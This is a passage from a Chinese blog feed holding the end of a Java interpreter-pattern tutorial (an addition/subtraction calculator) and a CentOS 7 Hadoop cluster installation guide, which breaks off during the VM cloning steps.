&lt;p&gt;解释器是一个简单语法分析工具， 它最显著的优点就是扩展性， 修改语法规则只要修改相应的非终结符表达式就可以了， 若扩展语法， 则只要增加非终结符类就可以了。&lt;/p&gt;
&lt;h3 id=&quot;25-缺点&quot;&gt;2.5 缺点&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;解释器模式会引起类膨胀。&lt;/li&gt;
&lt;li&gt;解释器模式采用递归调用方法，将会导致调试非常复杂。&lt;/li&gt;
&lt;li&gt;使用了大量的循环和递归，效率是一个不容忽视的问题。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;3-四则运算&quot;&gt;3. 四则运算&lt;/h2&gt;
&lt;p&gt;简单使用解释器模式实现一下加减法运算。&lt;/p&gt;
&lt;p&gt;首先定义一个计算类，用作解析器封装：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Calculator {
    private Expression expression;

    // 构造函数，传参并解析
    public Calculator(String expStr) {
        // 安排运算先后顺序
        Stack&amp;lt;Expression&amp;gt; stack = new Stack&amp;lt;&amp;gt;();
        // 表达式拆分为字符数组
        char[] charArray = expStr.toCharArray();

        Expression left = null;
        Expression right = null;

        for(int i=0; i&amp;lt;charArray.length; i++) {
            switch (charArray[i]) {
                case '+':
                    left = stack.pop();
                    right = new VarExpression(String.valueOf(charArray[++i]));
                    stack.push(new AddExpression(left, right));
                    break;
                case '-':
                    left = stack.pop();
                    right = new VarExpression(String.valueOf(charArray[++i]));
                    stack.push(new SubExpression(left, right));
                    break;
                default :
                    stack.push(new VarExpression(String.valueOf(charArray[i])));
                    break;
            }
        }
        this.expression = stack.pop();
    }

    public int run(HashMap&amp;lt;String, Integer&amp;gt; var) {
        return this.expression.interpreter(var);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来是一个抽象表达式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public abstract class Expression {
    abstract int interpreter(HashMap&amp;lt;String, Integer&amp;gt; var);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面是一个变量解析器：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class VarExpression extends Expression {
    private String key;
    public VarExpression(String key) {
        this.key = key;
    }
    @Override
    int interpreter(HashMap&amp;lt;String, Integer&amp;gt; var) {
        return var.get(this.key);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;变量解析器的主要作用是从 map 中将数据一个一个取出来。&lt;/p&gt;
&lt;p&gt;接下来是一个抽象运算符号解析器：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class SymbolExpression extends Expression {
    protected Expression left;
    protected Expression right;

    public SymbolExpression(Expression left, Expression right) {
        this.left = left;
        this.right = right;
    }
    @Override
    int interpreter(HashMap&amp;lt;String, Integer&amp;gt; var) {
        return 0;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;因为是运算符号，而每个运算符号都只和自己左右两个数字有关系，左右两个数字有可能也是一个解析的结果，无论何种类型，都是 Expression 类的实现类。&lt;/p&gt;
&lt;p&gt;接下来是两个具体的运算符号解析器，一个加号解析器和一个减号解析器：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class AddExpression extends SymbolExpression {
    public AddExpression(Expression left, Expression right) {
        super(left, right);
    }

    @Override
    int interpreter(HashMap&amp;lt;String, Integer&amp;gt; var) {
        return super.left.interpreter(var) + super.right.interpreter(var);
    }
}

public class SubExpression extends SymbolExpression {
    public SubExpression(Expression left, Expression right) {
        super(left, right);
    }

    @Override
    int interpreter(HashMap&amp;lt;String, Integer&amp;gt; var) {
        return super.left.interpreter(var) - super.right.interpreter(var);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后是我们的客户端类：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Client {
    public static void main(String[] args) throws IOException {
        String expStr = getExpStr();
        HashMap&amp;lt;String, Integer&amp;gt; var = getValue(expStr);
        Calculator calculator = new Calculator(expStr);
        System.out.println(&quot;运算结果：&quot; + expStr + &quot;=&quot; + calculator.run(var));
    }

    public static String getExpStr() throws IOException {
        System.out.print(&quot;请输入表达式：&quot;);
        return (new BufferedReader(new InputStreamReader(System.in))).readLine();
    }

    public static HashMap&amp;lt;String, Integer&amp;gt; getValue(String expStr) throws IOException {
        HashMap&amp;lt;String, Integer&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
        for(char ch : expStr.toCharArray()) {
            if(ch != '+' &amp;amp;&amp;amp; ch != '-' ) {
                if(! map.containsKey(String.valueOf(ch))) {
                    System.out.print(&quot;请输入&quot; + String.valueOf(ch) + &quot;的值：&quot;);
                    String in = (new BufferedReader(new InputStreamReader(System.in))).readLine();
                    map.put(String.valueOf(ch), Integer.valueOf(in));
                }
            }
        }
        return map;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行结果如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;请输入表达式：a+b-c
请输入a的值：10
请输入b的值：20
请输入c的值：13
运算结果：a+b-c=17
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;解释器模式在实际的系统开发中使用得非常少， 因为它会引起效率、 性能以及维护等问题， 一般在大中型的框架型项目能够找到它的身影， 如一些数据分析工具、 报表设计工具、科学计算工具等。&lt;/p&gt;
&lt;p&gt;如果遇到确定要使用解析器的场景，可以考虑一下 Expression4J 、 MESP（Math Expression String Parser） 、 Jep 等开源的解析工具包，功能都异常强大，而且非常容易使用，效率也还不错， 实现大多数的数学运算没有问题，完全自己没有必要从头开始编写解释器。&lt;/p&gt;
</description>
<pubDate>Mon, 21 Dec 2020 00:33:00 +0000</pubDate>
<dc:creator>极客挖掘机</dc:creator>
<og:description>1. 前文汇总 「补课」进行时：设计模式系列 2. 解释器模式 解释器模式这个模式和前面的访问者模式比较像，当然，我说的比较像是难的比较像，以及使用率是真的比较低，基本上没有使用的场景，访问者模式还有</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/babycomeon/p/14166288.html</dc:identifier>
</item>
<item>
<title>centos7安装Hadoop - xiaozhounandu</title>
<link>http://www.cnblogs.com/xiaozhounandu/p/14166282.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaozhounandu/p/14166282.html</guid>
<description>&lt;p&gt;（这篇博客是本人csdn原创）&lt;/p&gt;
&lt;h2 id=&quot;虚拟机的创建（可以自行百度）&quot;&gt;虚拟机的创建（可以自行百度）&lt;/h2&gt;
&lt;h2 id=&quot;虚拟机静态网络的设置&quot;&gt;虚拟机静态网络的设置&lt;/h2&gt;
&lt;p&gt;1：首先更改虚拟机的名字&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;hostnamectl  set-hostname hadoop2
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2：进入network配置文件夹中,配置你的虚拟网卡&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-html&quot;&gt;cd /etc/sysconfig/network-scripts/
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;vim ifcfg-ens33&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2020120308294554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3:在系统原来的配置上，改&lt;br/&gt;BOOTPROTO=static&lt;/p&gt;
&lt;p&gt;ONBOOT=yes&lt;/p&gt;
&lt;p&gt;4:添加配置（记得和你的相应配置相对应）&lt;br/&gt;IPADDR=192.168.72.100&lt;br/&gt;NETMASK=255.255.255.0&lt;br/&gt;GATEWAY=192.168.72.2&lt;br/&gt;DNS1=8.8.4.4&lt;/p&gt;
&lt;p&gt;5：下面就有一些长得比较帅的小同学问了，上面这些东西我从哪里来呢？，别着急，这就一步一步告诉你&lt;br/&gt;首先，打开vmware,点击编辑，&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2020120117214345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;点击虚拟网络编辑器&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201172749401.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击vMent8,再点击net设置即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201171634707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IPADDR 代表你的新的ip&lt;br/&gt;NETMASK 代表子网掩码&lt;br/&gt;GATEWAY 你的网关&lt;br/&gt;DNS1 你的 DNS（默认填写8.8.8.8）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201170903233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;配置好网络之后，记得重启网络服务&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;service network restart
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201173459801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;尝试ping百度&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;ping www.baidu.com
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201173602497.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后使用yum源安装你的vim,让你的字体拥有颜色&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-html&quot;&gt;yum -y install vim
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;xshell连接你的虚拟机，xftp传入hadoop和java的安装包&quot;&gt;xshell连接你的虚拟机，xftp传入hadoop和java的安装包&lt;/h2&gt;
&lt;p&gt;**xshell连接虚拟机不再过多介绍，&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201174505505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201174533270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201174642783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;开始解压java和hadoop的安装包&quot;&gt;开始解压java和hadoop的安装包&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cd ~
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201174808243.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在虚拟机opt目录下soft文件夹再在soft文件夹下创建java和hadoop文件夹&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201175402577.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cd ~
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;解压javaJDK到opt目录的java目录&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tar -zxvf jdk-8u261-linux-x64.tar.gz -C /opt/soft/java/
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201175837588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;解压hadoop到opt下的hadoop目录下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tar -zxvf hadoop-2.7.7.tar.gz -C /opt/soft/hadoop/
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201180000441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;查看是否解压成功&lt;/p&gt;
&lt;h3 id=&quot;将hadoop添加到环境变量&quot;&gt;将Hadoop添加到环境变量&lt;/h3&gt;
&lt;p&gt;获取 Hadoop 安装路径&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201180456681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打开/etc/profile 文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201180605481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在 profile 文件末尾添加 JDK 路径：（shitf+g）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;##HADOOP_HOME
export HADOOP_HOME=/opt/soft/hadoop/hadoop-2.7.7
export PATH=$PATH:$HADOOP_HOME/bin
export PATH=$PATH:$HADOOP_HOME/sbin
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;将java添加到环境变量&quot;&gt;将Java添加到环境变量&lt;/h3&gt;
&lt;p&gt;获取java安装环境&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201180838128.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打开/etc/profile 文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201180605481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;在 profile 文件末尾添加 JDK 路径&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;#JAVA_HOME
export JAVA_HOME=/opt/soft/jdk/jdk1.8.0_261
export PATH=$PATH:$JAVA_HOME/bin
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;退出保存后让配置生效&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt; source /etc/profile
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201181136969.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;测试java环境和hadoop环境&quot;&gt;测试Java环境和Hadoop环境&lt;/h3&gt;
&lt;p&gt;Java测试&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201181339664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;hadoop测试&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;hadoop version
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201181440637.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;开始hadoop完全分布式的搭建&quot;&gt;开始hadoop完全分布式的搭建&lt;/h2&gt;
&lt;p&gt;集群规划部署&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201181609617.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;strong&gt;配置集群&lt;/strong&gt;&lt;br/&gt;首先进入hadoop的相关目录（千万别进错目录了 （0-0））&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201181922645.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;strong&gt;配置 core-site.xml&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;
vim core-site.xml 
在该文件中编写如下配置

&amp;lt;!-- 指定 HDFS 中 NameNode 的地址 --&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;fs.defaultFS&amp;lt;/name&amp;gt;
 &amp;lt;value&amp;gt;hdfs://hadoop102:9000&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;!-- 指定 Hadoop 运行时产生文件的存储目录 --&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;hadoop.tmp.dir&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;/opt/hadoop/hadoop-2.7.7/data/tmp&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203082507917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;配置HDFS 配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;配置 hadoop-env.sh
vim hadoop-env.sh
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;export JAVA_HOME=/opt/java/jdk1.8.0_261&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201182702458.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;配置 hdfs-site.xml&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;vi hdfs-site.xml&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;dfs.replication&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;3&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;!-- 指定 Hadoop 辅助名称节点主机配置 --&amp;gt;
&amp;lt;property&amp;gt;
 &amp;lt;name&amp;gt;dfs.namenode.secondary.http-address&amp;lt;/name&amp;gt;
 &amp;lt;value&amp;gt;hadoop4:50090&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201202203336204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;**配置 yarn-env.sh

 vim yarn-env.sh**
 
export JAVA_HOME=/opt/java/jdk1.8.0_261
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203081319908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;**配置 yarn-site.xml
vi yarn-site.xml**

在该文件中增加如下配置


&amp;lt;!-- Reducer 获取数据的方式 --&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;mapreduce_shuffle&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;!-- 指定 YARN 的 ResourceManager 的地址 --&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;yarn.resourcemanager.hostname&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;hadoop3&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;yarn.log-aggregation-enable&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;!-- 日志保留时间设置 7 天 --&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;yarn.log-aggregation.retain-seconds&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;604800&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201202203430996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;**MapReduce 配置文件
配置 mapred-env.sh**

 vim mapred-env.sh
 
export JAVA_HOME=/opt/java/jdk1.8.0_261
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203080504573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;**配置 mapred-site.xml**

从模板复制一份并改名为 mapred-site.xml

cp mapred-site.xml.template mapred-site.xml

编辑 mapred-site.xml

vi mapred-site.xml
 
在该文件中增加如下配置


&amp;lt;!-- 指定 MR 运行在 Yarn 上 --&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;mapreduce.framework.name&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;yarn&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&amp;lt;!-- 历史服务器端地址 --&amp;gt;
&amp;lt;property&amp;gt;
&amp;lt;name&amp;gt;mapreduce.jobhistory.address&amp;lt;/name&amp;gt;
&amp;lt;value&amp;gt;hadoop2:10020&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;!-- 历史服务器 web 端地址 --&amp;gt;
&amp;lt;property&amp;gt;
 &amp;lt;name&amp;gt;mapreduce.jobhistory.webapp.address&amp;lt;/name&amp;gt;
 &amp;lt;value&amp;gt;hadoop2:19888&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201202203601576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;将配置好的虚拟机克隆为三台（如何克隆？不会？别慌！这就来教你）&quot;&gt;将配置好的虚拟机克隆为三台（如何克隆？不会？别慌！这就来教你）&lt;/h2&gt;
&lt;p&gt;1：&lt;strong&gt;首先，关闭你创建好的虚拟机&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;shutdown -h now
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203083844975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2 &lt;strong&gt;点击下一步&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203083945809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3 &lt;strong&gt;点击下一步&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203084010192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
